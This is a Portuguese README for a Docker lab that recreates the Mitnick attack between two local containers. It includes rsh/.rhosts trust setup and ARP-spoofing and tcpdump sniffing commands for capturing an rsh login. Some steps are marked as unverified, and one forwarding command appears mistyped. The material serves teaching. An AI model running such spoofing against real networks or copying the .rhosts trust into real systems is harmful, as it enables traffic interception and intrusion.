# Docker setup

## maquina local

para subir os dois containers rodar
`sudo bash start.sh` \
(duas vezes na primeira vez).

> **informacao de saida usa pra preencher os containers**

- comandos uteis:\
  `docker stop <nome>` \
  `docker rm <nome>`

## containers

- criar usuario no **server**: \
  adduser \<usuario> \
  passwd \<usuario> \
  $ digita senha <senha>

- configurar no **xterm** e no **server**:\
  adicionar IP NOME remoto em /etc/hosts \
  adicionar IP NOME remoto em /root/.rhosts

**No server**

- inicializar serviço servidor

```
server@id:$ /etc/init.d/openbsd-inetd start
```

## mitm

- em localhost: `cat 1 /proc/sys/net/ipv4/ip_forward`
- logar no server pelo **xterminal**:

```
// xterminal
xterm@id:$ rsh <IP_server> -l <username>
digita a senha de <username> do server

server@id:$ while :; do echo "Press [CTRL+C] to stop";sleep 4; done
```

- em **server**

```
server@id:$ tcpdump arp
```

- em **localhost** root:\
  (`ifconfig -a` mostra info do `docker0`)

```
// em uma tab
root@localhost:$ arpspoof -i docker0 -t <IP_server> <IP_xterm>

// em outra tab
root@localhost:$ arpspoof -i docker0 -t <IP_xterm> <IP_server>

// na 3a tab
user@localhost:$ tcpdump -A
```

# Mitnick Attack

https://www.macoratti.net/19/02/dock_imgfile1.htm

- Instalando o docker:

  - Na pasta ./server

    `docker build --rm -t server:1.0 .`

  - Na pasta ./Xterminal

    `docker build --rm -t xterminal:1.0 .`

  - Para ter certeza ue deu certo:

    `docker image ls`

    - Tem que aparecer as duas imagens

- Rodando os servidores:

  `docker run --name server -p 10000:222 server:1.0`

  `docker run --name xterminal -p 10001:222 xterminal:1.0`

- Entrando nos dockers:

  - Em outros novos terminais:

    `docker exec -it server /bin/bash`

    `docker exec -it xterminal /bin/bash`

- Rede

  Aprentemente o Docker cria uma subrede para rodar os containers

  - No meu caso ficou assim:

    server: 172.17.0.2

    xterminal: 172.17.0.3

<!-- Daqui para baixo nada é garantido -->

- Adicionando nome de host em /etc/hosts

  - No servidor:

        `echo "127.0.0.1    localhost

    ::1 localhost ip6-localhost ip6-loopback
    fe00::0 ip6-localnet
    ff00::0 ip6-mcastprefix
    ff02::1 ip6-allnodes
    ff02::2 ip6-allrouters
    172.17.0.2 <host_server>
    172.17.0.3 <host_client>" > /etc/hosts`

  - No cliente:

        `echo "127.0.0.1    localhost

    ::1 localhost ip6-localhost ip6-loopback
    fe00::0 ip6-localnet
    ff00::0 ip6-mcastprefix
    ff02::1 ip6-allnodes
    ff02::2 ip6-allrouters
    172.17.0.3 <host_client>
    172.17.0.2 <host_server>" > /etc/hosts`

- Adicionando usuários em ~/.rhosts:

  - No servidor:

    `echo "172.17.0.3      <host_client>" > ~/.rhosts`

  - No cliente:

    `echo "172.17.0.2   <host_server>" > ~/.rhosts`
